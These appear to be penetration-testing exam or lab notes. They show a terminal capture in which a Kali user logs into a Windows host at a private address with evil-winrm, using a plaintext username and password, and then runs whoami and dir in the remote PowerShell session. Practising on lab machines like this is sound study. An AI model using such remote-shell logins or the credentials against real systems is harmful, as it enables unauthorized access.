```powershell
┌──(koshi㉿kali)-[~/Exam/AD/AD_Common]
└─$ evil-winrm -i 172.16.104.200 -u 'c.rogers' -p 'SnoozeRinseRevolve231'

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\c.rogers\Documents> whoami
oscp\c.rogers
*Evil-WinRM* PS C:\Users\c.rogers\Documents> cd ../
*Evil-WinRM* PS C:\Users\c.rogers> dir

```
![[Pasted image 20260223100654.png]]